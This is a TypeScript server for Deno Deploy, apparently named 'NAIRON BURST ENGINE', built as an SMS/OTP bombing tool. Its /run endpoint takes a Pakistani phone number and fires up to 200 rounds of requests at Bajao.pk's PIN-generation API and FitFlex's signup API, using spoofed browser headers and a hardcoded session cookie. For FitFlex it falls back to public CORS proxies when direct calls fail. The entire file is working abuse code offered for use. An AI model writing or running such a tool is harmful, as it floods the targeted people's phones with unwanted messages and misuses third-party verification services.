// main.ts — Deno Deploy backend (FULL FIXED)
// Deploy at: https://dash.deno.com

const BAJAO_URL = 'https://bajao.pk/api/v2/login/generatePinV2?siteid&selOperator=2';
const FITFLEX_URL = 'https://prod.fitflexapp.com/api/users/signupV1';

const UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36';

// 🔥 Bajao.pk cookie — expire hone par refresh karo
const BAJAO_COOKIE = 'JSESSIONID=662C09F1B98C698F16D182AB76A39B64; userId=1790477302038; G_ENABLED_IDPS=google; noo-playlist=; DVID=1790477307003; _gcl_au=1.1.1373219935.1790477308; _ga=GA1.1.642208451.1790477308; _ga_4JGGKSBQDG=GS2.1.s1790477307$o1$g1$t1790477312$j55$l0$h0; _tt_enable_cookie=1; _ttp=01M3GC79G7VBN49QYE2S96KBGG_.tt.1.1790477313544; _fbp=fb.1.1790477313715.275511547957534248';

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, X-Auth-Token',
};

// Max parallel requests per burst (Deno Deploy safe limit)
const MAX_BURST = 200;
const BATCH_SIZE = 25; // 25 concurrent requests at a time

function toIntl(num: string): string {
  let s = String(num).replace(/\D/g, '');
  if (s.startsWith('0')) s = s.slice(1);
  if (!s.startsWith('92')) s = '92' + s;
  return s;
}

function log(tag: string, msg: string) {
  console.log(`[${new Date().toISOString()}] [${tag}] ${msg}`);
}

// ============================================================
// BAJAO.PK — working
// ============================================================
async function fireBajao(uuid: string, idx: number): Promise<{ status: number; body: string; error?: string }> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 12000);

  try {
    const body = new URLSearchParams();
    body.append('uuid', uuid);

    const res = await fetch(BAJAO_URL, {
      method: 'POST',
      signal: controller.signal,
      headers: {
        'User-Agent': UA,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://bajao.pk',
        'Referer': 'https://bajao.pk/create',
        'Cookie': BAJAO_COOKIE,
        'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
      },
      body: body.toString(),
      redirect: 'manual',
    });

    clearTimeout(timer);
    const txt = await res.text();
    const short = txt.slice(0, 120).replace(/\s+/g, ' ');
    log(`BAJAO #${idx}`, `uuid=${uuid} → HTTP ${res.status} | ${short}`);
    return { status: res.status, body: txt };
  } catch (e) {
    clearTimeout(timer);
    const msg = e instanceof Error ? e.message : String(e);
    log(`BAJAO #${idx}`, `ERR: ${msg}`);
    return { status: 0, body: '', error: msg };
  }
}

// ============================================================
// FITFLEX — 3-layer fallback
// Layer 1: Direct fetch
// Layer 2: allorigins proxy
// Layer 3: corsproxy.io
// ============================================================
async function fireFitflex(msisdn: string, idx: number): Promise<{ status: number; body: string; error?: string }> {
  const payload = JSON.stringify({
    msisdn: msisdn,
    type: 'msisdn',
    device_name: 'Netscape',
    app_version: '1.0',
    user_platform: UA,
  });

  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Accept-Language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'Origin': 'https://fitflexapp.com',
    'Referer': 'https://fitflexapp.com/',
    'User-Agent': UA,
    'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
  };

  // ---------- LAYER 1: Direct ----------
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 10000);

    const res = await fetch(FITFLEX_URL, {
      method: 'POST',
      signal: controller.signal,
      headers,
      body: payload,
    });
    clearTimeout(timer);

    const txt = await res.text();
    const short = txt.slice(0, 120).replace(/\s+/g, ' ');
    log(`FITFLEX #${idx}`, `DIRECT → HTTP ${res.status} | ${short}`);
    return { status: res.status, body: txt };
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    log(`FITFLEX #${idx}`, `Layer1 failed (${msg}) → trying proxy...`);
  }

  // ---------- LAYER 2: allorigins ----------
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 12000);

    const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(FITFLEX_URL);
    const res = await fetch(proxyUrl, {
      method: 'POST',
      signal: controller.signal,
      headers: { 'Content-Type': 'application/json', 'User-Agent': UA },
      body: payload,
    });
    clearTimeout(timer);

    const txt = await res.text();
    const short = txt.slice(0, 120).replace(/\s+/g, ' ');
    log(`FITFLEX #${idx}`, `PROXY1 → HTTP ${res.status} | ${short}`);
    return { status: res.status, body: txt };
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    log(`FITFLEX #${idx}`, `Layer2 failed (${msg}) → trying proxy2...`);
  }

  // ---------- LAYER 3: corsproxy.io ----------
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 12000);

    const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(FITFLEX_URL);
    const res = await fetch(proxyUrl, {
      method: 'POST',
      signal: controller.signal,
      headers: { 'Content-Type': 'application/json', 'User-Agent': UA },
      body: payload,
    });
    clearTimeout(timer);

    const txt = await res.text();
    const short = txt.slice(0, 120).replace(/\s+/g, ' ');
    log(`FITFLEX #${idx}`, `PROXY2 → HTTP ${res.status} | ${short}`);
    return { status: res.status, body: txt };
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    log(`FITFLEX #${idx}`, `ALL LAYERS failed: ${msg}`);
    return { status: 0, body: '', error: msg };
  }
}

// ============================================================
// BATCH RUNNER — controls concurrency so Deno Deploy doesn't crash
// ============================================================
async function runInBatches<T>(tasks: (() => Promise<T>)[], batchSize: number): Promise<T[]> {
  const results: T[] = [];
  for (let i = 0; i < tasks.length; i += batchSize) {
    const batch = tasks.slice(i, i + batchSize);
    const batchResults = await Promise.all(batch.map(fn => fn()));
    results.push(...batchResults);
  }
  return results;
}

// ============================================================
// MAIN HANDLER
// ============================================================
Deno.serve(async (req: Request) => {
  const url = new URL(req.url);

  // -------- CORS preflight --------
  if (req.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers: CORS });
  }

  // ============================================================
  // /debug — single request detail
  // ============================================================
  if (url.pathname === '/debug') {
    const num = (url.searchParams.get('num') || '').trim();
    if (!num) {
      return new Response(JSON.stringify({ ok: false, error: 'no num' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json', ...CORS },
      });
    }
    const b = await fireBajao(num, 0);
    const f = await fireFitflex(toIntl(num), 0);
    return new Response(
      JSON.stringify({
        bajao: { status: b.status, body: b.body.slice(0, 800), error: b.error || null },
        fitflex: { status: f.status, body: f.body.slice(0, 800), error: f.error || null },
      }),
      { status: 200, headers: { 'Content-Type': 'application/json', ...CORS } }
    );
  }

  // ============================================================
  // /run — burst fire
  // ============================================================
  if (url.pathname === '/run') {
    const num = (url.searchParams.get('num') || '').trim();
    const countStr = url.searchParams.get('count') || '50';
    let count = parseInt(countStr, 10);
    if (!Number.isFinite(count) || count < 1) count = 50;
    if (count > MAX_BURST) count = MAX_BURST;

    if (!num) {
      return new Response(JSON.stringify({ ok: false, error: 'no number' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json', ...CORS },
      });
    }

    const uuid = num;
    const msisdn = toIntl(num);
    const t0 = Date.now();

    log('API', `Burst START num=${num} count=${count}`);

    // Build task list — 2 requests per iteration
    const taskFns: (() => Promise<{ type: string; status: number; body: string; error?: string }>)[] = [];
    for (let i = 1; i <= count; i++) {
      taskFns.push(async () => {
        const r = await fireBajao(uuid, i);
        return { type: 'bajao', ...r };
      });
      taskFns.push(async () => {
        const r = await fireFitflex(msisdn, i);
        return { type: 'fitflex', ...r };
      });
    }

    // Run in batches to avoid crashing
    const results = await runInBatches(taskFns, BATCH_SIZE);

    // Tally
    let bajaoOk = 0, bajaoFail = 0;
    let fitflexOk = 0, fitflexFail = 0;
    const bajaoSamples: string[] = [];
    const fitflexSamples: string[] = [];

    for (const r of results) {
      if (r.type === 'bajao') {
        if (r.status >= 200 && r.status < 300) {
          bajaoOk++;
          if (bajaoSamples.length < 3) {
            bajaoSamples.push(`${r.status}: ${r.body.slice(0, 150)}`);
          }
        } else {
          bajaoFail++;
        }
      } else {
        if (r.status >= 200 && r.status < 300) {
          fitflexOk++;
          if (fitflexSamples.length < 3) {
            fitflexSamples.push(`${r.status}: ${r.body.slice(0, 150)}`);
          }
        } else {
          fitflexFail++;
        }
      }
    }

    const elapsed = ((Date.now() - t0) / 1000).toFixed(2);
    log('BURST', `DONE in ${elapsed}s | BAJAO ${bajaoOk}/${count} | FITFLEX ${fitflexOk}/${count}`);

    return new Response(
      JSON.stringify({
        ok: true,
        uuid,
        msisdn,
        count,
        elapsed: parseFloat(elapsed),
        bajao: { ok: bajaoOk, fail: bajaoFail, samples: bajaoSamples },
        fitflex: { ok: fitflexOk, fail: fitflexFail, samples: fitflexSamples },
        total: results.length,
      }),
      { status: 200, headers: { 'Content-Type': 'application/json', ...CORS } }
    );
  }

  // ============================================================
  // default
  // ============================================================
  return new Response(
    JSON.stringify({
      ok: true,
      service: 'NAIRON BURST ENGINE',
      endpoints: ['/run?num=03XXXXXXXXX&count=50', '/debug?num=03XXXXXXXXX'],
    }),
    { status: 200, headers: { 'Content-Type': 'application/json', ...CORS } }
  );
});
